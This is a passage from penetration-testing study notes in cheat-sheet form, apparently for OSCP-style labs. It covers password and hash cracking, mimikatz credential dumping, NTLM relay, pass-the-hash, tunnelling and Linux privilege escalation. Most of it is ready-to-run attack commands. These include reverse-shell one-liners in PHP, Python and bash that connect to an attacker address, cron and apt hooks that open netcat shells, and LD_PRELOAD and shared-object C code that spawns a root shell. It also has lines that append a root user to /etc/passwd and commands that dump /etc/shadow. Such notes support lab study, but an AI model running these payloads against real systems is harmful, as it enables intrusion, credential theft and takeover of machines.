- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- `hashcat -m 24200 user.hash /usr/share/wordlists/rockyou.txt --force`
- `hashcat -m 10900 'pbkdf2_sha256$216000$8Dawv0l1PGBR$n/Jnp5J0RM++B/vjWFp3R/jRzFaxGLxK9KGgwTuvX3M=' /usr/share/wordlists/rockyou.txt --force`
- https://systemweakness.com/cracking-user-passwords-stored-in-keycloak-with-hashcat-d56522cc2dc


#### Ophcrack

1. Install the tables
2. Load a password file with `Load`
3. Click on the `Crack` button

#### Password Manager: KeePass
- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` search for KeePass database files
- `keepass2john Database.kdbx > keepass.hash` format KeePass database for Hashcat with keepass2john
  - remove `Database:` from `keepass.hash`
- `hashcat -m 13400 keepass.hash wordlist.txt -r hashcat.rule --force` crack the KeePass database hash
  - find the mode of KeePass in Hashcat with `hashcat --help | grep -i "KeePass"`


#### SSH Private Key Passphrase

- Prerequisites: found username, old passwords (or common passwords), password policy and private key `id_rsa`
  - `chmod 600 id_rsa` to change the permissions
  - `id_rsa` needs a password
1. `ssh2john id_rsa > ssh.hash` > remove `id_rsa:`
2. For JtR, create a file for the rules in the file `ssh.rule` using the found password policy
   - add `[List.Rules:sshRules]` as the first line of the file
   - add the rules to JtR config `sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'`
3. `john --wordlist=ssh.passwords --rules=sshRules ssh.hash`
4. Connect to the ssh service with `ssh -i id_rsa -p <PORT> <user>@<IP>` and insert the found password

#### <ins>Network Service Attack</ins>

**Tools**
- [Metasploit](https://www.metasploit.com/)
- [Medusa](http://h.foofus.net/?page_id=51)
- [Spray](https://github.com/Greenwolf/Spray)
- [Crowbar](https://github.com/galkan/crowbar)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)

#### Metasploit

- SSH Brute force: `scanner/ssh/ssh_login`

#### Medusa, HTTP htaccess Attack

- `medusa -d` All the protocols medusa can interact with
- ` medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
  - `-m` htaccess-protected URL
  - `-h` target host
  - `-u` attack the admin user
  - `-P` wordlist file
  - `-M` HTTP authentication scheme

#### Crowbar, Remote Desktop Protocol Attack

- `crowbar --help`
- `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
  - `-b` specify the protocol
  - `-s` target server
  - `-u` username
  - `-c` wordlist
  - `-n` number of threads

#### THC Hydra

- `sudo hydra`
- `sudo hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
  - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
  - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
  - Specify a port with `-s <PORT>` in <options>
- `hydra -L usernames.txt -P passwords.txt 192.168.244.140 smtp -e nsr`
- `hydra -L usernames.txt -P usernames.txt 192.168.182.216 ssh -e nsr`
- `sudo hydra -L usernames.txt -P passwords.txt 192.168.157.21 smb2 -e nsr`
- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.190.208:7080/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`

SSH Attack
- `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
  - `-l` specify the target username
  - `-P` specify a wordlist
  - `protocol://IP` o specify the target protocol and IP address respectively

HTTP POST Attack
- `sudo hydra http-form-post -U`
- `sudo hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
  - `-l` user name
  - `-P` wordlist
  - `-vV` verbose output
  - `-f` stop the attack when the first successful result is found
  - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`

#### Password protected files
- dfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
- rar2john backup.rar > crackme
  - john --wordlist=/usr/share/wordlists/rockyou.txt crackme
  - same for zip2john
- ssh2john id_rsa > ssh.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
- office2john RSA-Secured-Document-PII.docx > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- keepass2john jeeves.kdbx > jeeves.hash
  john jeeves.hash
- fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup1.zip

#### Custom wordlists
- Cewl
  - (at first, use just this list) `cewl http://192.168.134.126/ --with-numbers -w custom-wordlist.txt`
  - `cewl -d 5 -m 3 http://192.168.220.115/ -w custom-wordlist.txt`
  - `cewl --lowercase http://192.168.13444.126/ | grep -v CeWL >> custom-wordlist.txt`
  - `sort custom-wordlist.txt | uniq -u > final-wordlist.txt`
- generate usernames
  - `python2 ~/Documents/scripts/usernamer.py -f full_names.txt`
- `cupp -i`

#### More attacks
- `crackmapexec ssh 192.168.220.240 -u usernames.txt -p passwords.txt --continue-on-success`
- AES-256-CBC-PKCS7: https://github.com/mpgn/Padding-oracle-attack
  - `python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.229.119:2290 -u '/?c=' --error '<span id="MyLabel">0</span>'`

#### <ins>Leveraging Password Hashes</ins>

**Tools**
- [Sample password hash encoding strings](https://openwall.info/wiki/john/sample-hashes)
- [hashID](https://psypanda.github.io/hashID/)
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [mimikatz](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html)
- [fgdump](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)
- [Credential Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
- [Responder.py](https://github.com/SpiderLabs/Responder)

**Notes**
- On most Linux systems, hashed passwords are stored in the `/etc/shadow` file
- On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
- Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
- From Windows Vista on, the operating system disables LM by default and uses NTLM
- In Windows, get all local users in PowerShell with `Get-LocalUser`

#### Identify hashes
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
- [hashid](https://www.kali.org/tools/hashid/)
  - `hashid <HASH>`
- [Hash Analyzer - TunnelsUP](https://www.tunnelsup.com/hash-analyzer/)

#### mimikatz
1. `C:\Programs\mimikatz.exe`
2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
4. `lsadump::sam` dump the contents of the SAM database

#### Cracking NTLM
1. Identify the local users with `Get-LocalUser`
2. Run `mimikatz.exe` as an administrator
3. Use the command `privilege::debug` to have `SeDebugPrivilege` access right enabled
4. Use the command `token::elevate` to elevate to SYSTEM user privileges
5. Extract passwords from the system
   - `sekurlsa::logonpasswords` attempts to extract plaintext passwords and password hashes from all available sources
   - `lsadump::sam` extracts the NTLM hashes from the SAM
6. Run `hashcat --help | grep -i "ntlm"` to retrieve the correct hash mode
7. `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

#### Cracking Net-NTLMv2 (or NTLMv2)

Capture a Net-NTLMv2 hash
1. `ip a` retrieve a list of all interfaces
2. `sudo responder -I <interface>`
3. Wait for a connection, capture the hash and save it as `user.hash`

Crack the Net-NTLMv2 hash
1. `hashcat --help | grep -i "ntlm"`
2. `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force`

Relaying Net-NTLMv2
1. Instead of printing a retrieved Net-NTLMv2 hash, we'll forward it to `<IP>` that it's the target machine
2. `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <BASE64>"`
   - use it to execute a reverse shell on your machine on port `<PORT>` and run a listener `nc -nvlp <PORT>`
   - see how to encode one-liner in base64 [here](#microsoft-office)
3. Now, if a user tries to connect to our machine with `dir \\<ATTACKER-IP>\test`, it will forward the request to `<IP>` and execute the command specified in the flag `-c`


#### Pass-the-Hash

Note: this attack works for `Administrator` user (except for certain conditions). Since Windows Vista, all Windows versions have [UAC remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) enabled by default.
- From Mimikatz, run `privilege::debug`, `token::elevate` and `lsadump::sam` to obtain the NTLM hash of Administrator
- Gain access to a SMB share with `smbclient \\\\<IP>\\<SMB-SHARE> -U Administrator --pw-nt-hash <Administrator-HASH>`
- Gain an interactive shell with `impacket-psexec -hashes <LMHash>:<NTHash> <username>@<ip> <command>`
  - This will always give a shell as `SYSTEM`, use `impacket-wmiexec` to obtain a shell as the user used for authentication
  - `<command>` is optional. If left blank, cmd.exe will be executed
  - See also: [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) 

Other notes:
- ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
- ["PsExec Explainer by Mark Russinovich"](https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich)
- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
  - `pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe`
  - `-U` specifying the username and hash, along with the SMB share and the name of the command to execute



## Port Redirection and Tunneling

**Tools and notes**
- [rinetd](https://github.com/samhocevar/rinetd)
- [ProxyChains](https://github.com/haad/proxychains)
- [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
- [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
- [PWK Notes: Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)

### <ins>Port Forwarding</ins>

#### rinetd

1. Edit `/etc/rinetd.conf`, add `0.0.0.0 <Local-PORT> <IP> <DEST-PORT>`
   - This means that all traffic received on port `<Local-PORT>` of our machine, listening on all interfaces (`0.0.0.0`), regardless of destination address, will be forwarded to `<IP>:<DEST-PORT>`. 
2. Restart rinetd `sudo service rinetd restart` and confirm that the port is bound with `ss -antp | grep "80"`


#### Socat

- `socat -ddd TCP-LISTEN:<PORT>,fork TCP:<DEST-IP>:<DEST-PORT>`
  - The traffic received on port `<PORT>` will be forwarded to `<DEST-IP>:<DEST-PORT>`
- Example with SSH `socat TCP-LISTEN:2222,fork TCP:<IP>:22`
- Example with psql -h 192.168.50.63 -p 2345 -U postgres `socat -ddd TCP-LISTEN:2345,fork TCP:<IP>:5432`


### <ins>SSH Tunneling</ins>

See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/academy/ssh/tunneling-example)

#### SSH Local Port Forwarding
	
- Give a reverse shell [TTY](https://en.wikipedia.org/wiki/TTY) functionality with Python3's pty: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>`
- `ssh -N -L <bind_address>:<port>:<host>:<hostport> <username>@<address>`
  - Listen on all interfaces (`<bind_address>` = `0.0.0.0`) on port `<port>`, then forward all packets through the SSH tunnel (`<username>@<address>`) to port `<hostport>` on the host `<host>`
  - Verify it with `ss -ntplu`

#### SSH Dynamic Port Forwarding
1. From the reverse shell, run `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
2. Now we must direct our tools to use this proxy with ProxyChains
   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  <IP-reverse-shell> <port to bind to>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
   - Example with nmap: `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <IP>`
   - Example with SMB: `proxychains smbclient -L //<IP>/ -U <username> --password=<password>`

#### SSH Remote Port Forwarding
1. Start ssh on your local machine
2. On the reverse shell: `ssh -N -R [bind_address]:port:host:hostport [username@address]`
   - Set `[bind_address]` as `127.0.0.1`
   - `[username@address]` of your local ssh


#### SSH Remote Dynamic Port Forwarding
1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
   - `[username@address]` of your local ssh
2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  127.0.0.1 <PORT>`
3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains


#### Sshuttle
1. Note: it requires root privileges on the SSH client and Python3 on the SSH server
2. From the reverse shell, run `socat TCP-LISTEN:2222,fork TCP:<forward-IP>:<forward-PORT>`
3. `sshuttle -r <ssh-connection-string> <subnet> ...`
   - Specify the SSH connection string we want to use `<ssh-connection-string>` and the subnets that we want to tunnel through this connection (ex. `10.74.23.0/24 172.16.163.0/24`)


### <ins>ssh.exe</ins>
1. Start SSH server on Kali `sudo systemctl start ssh`
2. Connect to the Windows machine. Note: OpenSSH bundled with Windows has to be higher than `7.6` for remote dynamic port forwarding
3. `ssh -N -R <PORT> <kali>@<IP>`
4. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
5. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains

### <ins>Plink.exe</ins>

The general format is: `plink.exe <user>@<kali-IP> -R <kaliport>:<target-IP>:<target-port>`

The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`.

### <ins>Netsh</ins>

#### Local port forwarding
`netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<forward-PORT> connectaddress=<forward-IP>`
- use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
- listening on `<target-IP>` (`listenaddress=target-IP`), port `<target-port>` (`listenport=<target-port>`)
- that will forward to `<forward-IP>` (`connectaddress=<forward-IP>`), port `<forward-port>` (`connectport=<forward-port>`)

#### allow inbound traffic on TCP port 4455
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`


### <ins>Chisel</ins>

- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://ap3x.github.io/posts/pivoting-with-chisel/
- https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
- https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
- To have the process in the background, use `&` at the end of the command

**Port forwarding with chisel**: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
```
./chisel server -p 9999 --reverse
./chisel client 192.168.45.193:9999 R:8000:socks                <# dynamic port forwarding #>
./chisel.exe client 192.168.45.193:9999 R:8090:localhost:80     <# port forwarding port 80 
                                                                     connect then to localhost:8090 
                                                                     usefull for /phpmyadmin/ #>
```

**Proxy**
1. on the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. on the remote machine: `.\chisel.exe client ATTACKING_IP:LOCAL_OPEN_PORT R:LISTEN_PORT:socks`

**Reverse SOCKS Proxy**
1. On the attacker machine: `chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:socks`
3. `sudo nano /etc/proxychains.conf`
   comment everything under `[ProxyList]` and add a new line `socks5 127.0.0.1 LISTEN_PORT`
   + you can also add FoxyProxy > `socks5 127.0.0.1 4242`

**Forward SOCKS Proxy**
1. On the remote machine: `./chisel server -p LISTEN_PORT --socks5`
2. On the attacker machine: `chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

**Remote Port Forward**
1. On the attacker machine: `./chisel server -p LISTEN_PORT --reverse`
2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT`

**Local port forwarding**
1. On the remote machine: `chisel server -p LISTEN_PORT`
2. On the attacker machine: `.\chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

**HTTP Tunneling**
1. The machines are `KALI01`, `DMZ01` and `INTERNAL01`
   - `KALI01` will listen on TCP port `1080`, a SOCKS proxy port
2. In `KALI01`, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
3. Deliver the Chisel executable to the `DMZ`
4. On `KALI01`, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
   - `ip a` retrieve the list of all interfaces
5. On `DMZ01`, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
7. Check if the SOCKS port has been opened by the `KALI01` Chisel server with `ss -ntplu`
8. How to use the HTTP Tunnel
   - SSH with Ncat: Pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
     - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
     - `%h` and `%p` tokens represent the SSH command host and port values
   - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run


### <ins>DNS Tunneling</ins>

#### Dnsmasq to setup a DNS resolver
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. From a machine inside `WAN`, setup a DNS server by using a software like [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)
   - `sudo dnsmasq -C dnsmasq.conf -d`. An example of configuration (see also [dnsmasq.conf.example](https://github.com/PowerDNS/dnsmasq/blob/master/dnsmasq.conf.example)):
     ```
     # Do not read /etc/resolv.conf or /etc/hosts
     no-resolv
     no-hosts

     # Define the zone
     auth-zone=organization.corp
     auth-server=organization.corp

     # TXT record
     txt-record=www.organization.corp,some info.
     txt-record=www.organization.corp,some other info.
     ```
   - `sudo tcpdump -i ens192 udp port 53`

#### [dnscat2](https://github.com/iagox86/dnscat2)
1. Setup: `WAN`, `DMZ` and `INTERNAL`
2. Start `dnscat2-server organization.corp` from `WAN` and connect from `INTERNAL` to it with `./dnscat feline.corp`
3. From `dnscat2-server` > `window -i 1` > `listen 127.0.0.1:<lister-PORT> <IP>:<PORT>`
   - `<IP>:<PORT>` = machine from `INTERNAL` 

### <ins>Metasploit Portfwd</ins>
- [Metasploit Unleashed - Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)

### <ins>Linux Privilege Escalation</ins>

#### <ins>Resources</ins>
- [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [Linux Privilege Escalation for OSCP & Beyond! | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)
- ["Understanding and Using File Permissions | Ubuntu"](https://help.ubuntu.com/community/FilePermissions)
- ["File permissions and attributes | Arch Linux"](https://wiki.archlinux.org/title/File_permissions_and_attributes)
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- Tools
  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
      - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
  - [Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
    - `./unix-privesc-check standard > output.txt`
  - [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [Reverse Shell Generator - rsg](https://github.com/mthbernardes/rsg)

#### <ins>Strategy</ins>
1. Check your user with `id` and `whoami`
2. Run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with increasing levels
   - starting from lvl `0` to `2`, `./lse.sh -l 0`
3. Run other scripts like `lse_cve.sh`
4. Check for default / weak credentials
   - example: `username:username`, `root:root`
5. Check the directory `opt/` for possible apps to exploit
6. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

#### <ins>Reverse Shell</ins>

**PHP**
```php
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Python**

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Bash**
```bash
#!/bin/bash
/usr/bin/bash -i >& /dev/tcp/192.168.45.226/445 0>&1
```


**More shells**
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Generator](https://www.revshells.com/)
- [Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
  - `python -c 'import pty;pty.spawn("/bin/bash")'`
  - `/usr/bin/script -qc /bin/bash /dev/null`

#### <ins>Service Exploits</ins>

- `ps aux | grep "^root"` Show all process running as root
- Identify the program version with `<program> --version` or `<program> -v`
  - On Debian like systems, run ` dpkg -l | grep <program>`
  - On systems that use rpm, run `rpm –qa | grep <program>`

**Check services running on localhost**
- `netstat -tlpn`
- `ss -antp`
- `ps -auxwf`

**Check which services run as root**
- ```
  find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
  ps -aux | grep root | grep sql
  ss -antp
  ```
- note: if you find `relayd`
  - `/usr/sbin/relayd -C /etc/shadow`
  - now you can read `/etc/shadow`

**MySQL service running as root with no password assigned**
- Run `mysqld --version`
- One great exploit is the following: [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
  - Once the UDF is installed, run the following command in the MySQL shell: `mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`
  - Run `/tmp/rootbash` for a root shell: `/tmp/rootbash -p`

#### <ins>Weak File Permissions</ins>

**Readable /etc/shadow**
- Check if `/etc/shadow` is readable with `ls -l /etc/shadow`
- ```
  cat /etc/shadow > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- shadow + passwd
  ```
  unshadow passwd shadow > passwords
  john --wordlist=/usr/share/wordlists/rockyou.txt passwords
  ```

**Readable /etc/passwd**
- if you find hashes
  ```
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```

**Writable /etc/shadow**
- Check if `/etc/shadow` is writable with `ls -l /etc/shadow`
- Generate a new password hash with `mkpasswd -m sha-512 newpass`
- Substitute the root password hash with the new hash with `nano /etc/shadow`

**Writable /etc/passwd**
1. Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
2. Generate a new password hash with `openssl passwd newpass`
3. Substitute the root password hash with the new hash with `nano /etc/passwd`
   - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
     - test the new user with `su root2` and `id`


#### <ins>Exposed Confidential Information</ins>

- `env` inspect environment variables
  - `/etc/environment`
- `cat .bashr` ispect .bashrc
- `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
- `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
- `history`
- `cat ~/.profile`

**Password disclosure**
- `watch -n 1 "ps -aux | grep pass"`
- `sudo tcpdump -i lo -A | grep "pass"`
- search for passwords
  - `grep -rnw . -ie password --color=always 2>/dev/null`
  - `grep -rnw . -ie tom --color=always 2>/dev/null`
  - `grep -rnw . -ie DB_PASSWORD --color=always 2>/dev/null`
- check `wp-config.php` in:
  - `/var/www/html`
  - `/srv/http`

#### <ins>SSH</ins>
- `find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null` find SSH keys

#### <ins>Sudo</ins>

**Classic method**
- Try to run `sudo su`
- If `su` doesn't work, try with the followings
  - `sudo -s`
  - `sudo -i`
  - `sudo /bin/bash`
  - `sudo passwd`

**Shell Escape Sequences**
- `sudo -l` list the programs which sudo allows your user to run
- See [GTFOBins](https://gtfobins.github.io) and search for the program names

If you find something like the following, see if there are any services that can be restarted to have reverse shell as root
```
(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```
- sudo /sbin/reboot

Path traversal:
1. `sudo -l` > `(ALL) NOPASSWD: /usr/bin/tee /var/log/httpd/*`
2. add new user 'toor:password' > `echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd`

**Environment Variables**
- `sudo -l` check which environment variables are inherited, look for the `env_keep` options
  - `LD_PRELOAD` loads a shared object before any others when a program is run 
  - `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
- First solution
  - Create a shared object with `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c`, use the code below
    ```C
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
  
    void _init() {
    	unsetenv("LD_PRELOAD");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - `sudo LD_PRELOAD=/tmp/preload.so <program name>` Run one of the programs you are allowed to run via sudo while setting the `LD_PRELOAD` environment variable to the full path of the new shared object
- Second solution, with `apache`
  - See which shared libraries are used by apache `ldd /usr/sbin/apache2`
  - Create a shared object with the same name as one of the listed libraries, `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c`
  - ```C
    #include <stdio.h>
    #include <stdlib.h>
    
    static void hijack() __attribute__((constructor));
    
    void hijack() {
    	unsetenv("LD_LIBRARY_PATH");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - Run `apache2` using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`, where the output of the compiled shared object is

**sudoedit**
If you find Sudo < 1.8.15 and something like: `(root) NOPASSWD: sudoedit /home/*/*/recycler.ser`
- CVE-2015-5602, see https://al1z4deh.medium.com/proving-grounds-cassios-4686e6fa8df6

#### <ins>Cron Jobs</ins>

Run:
- `cat /etc/crontab`, `crontab -l`, `pspy`
- `grep "CRON" /var/log/syslog`
- 

**File Permissions**
- View the contents of the system-wide crontab `cat /etc/crontab`, the cron log file `grep "CRON" /var/log/syslog` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
- If one of them is world-writable, substitute it with the following
  ```C
  #!/bin/bash
  bash -i >& /dev/tcp/<Your-IP>/4444 0>&1
  ```
  - You can also try with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your-IP> 4444 >/tmp/f`
- Open a listener with `nc -nvlp 4444`

**PATH Environment Variable**
- See [Task 9 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- The crontab `PATH` environment variable is by default set to `/usr/bin:/bin` and can be overwritten in the crontab file
- It might be possible to create a program or script with the same name as the cron job if the program or script for a cron job does not utilize an absolute path and one of the PATH directories is editable by our user.

**Wildcards**
- See [Task 10 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`
  - make it executable `chmod +x shell.elf`
- run other commands as part of a checkpoint feature
  - `touch /home/user/--checkpoint=1`
  - `touch /home/user/--checkpoint-action=exec=shell.elf`

**apt running as root**
1. `cd /etc/apt/apt.conf.d/`
2. `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell`

#### <ins>SUID / SGID Executables</ins>

**setuid + GTFOBins**
- Check for setuid binaries on the machine
  - `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
  - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [GTFOBins](https://gtfobins.github.io/) to elevate your privileges

**wget + setuid**
- You can use it to add a root user
  1. obtain `/etc/passwd` from the victim
  2. add the new user `echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd`
     - password hash generated with `openssl passwd mypass`
  3. overwrite `/etc/passwd` > `wget http://ATTACKERIP/passwd -o /etc/passwd`

**Known Exploits**
- Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [Exploit-DB](https://www.exploit-db.com/), Google and GitHub to find known exploits

**Shared Object Injection**
- See [Task 12 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- `strace <program to run> 2>&1 | grep -iE "open|access|no such file"` run strace and search the output for open/access calls and for "no such file" errors
- ```C
  #include <stdio.h>
  #include <stdlib.h>
  
  static void inject() __attribute__((constructor));
  
  void inject() {
  	setuid(0);
  	system("/bin/bash -p");
  }
  ```
  
**Environment Variables**
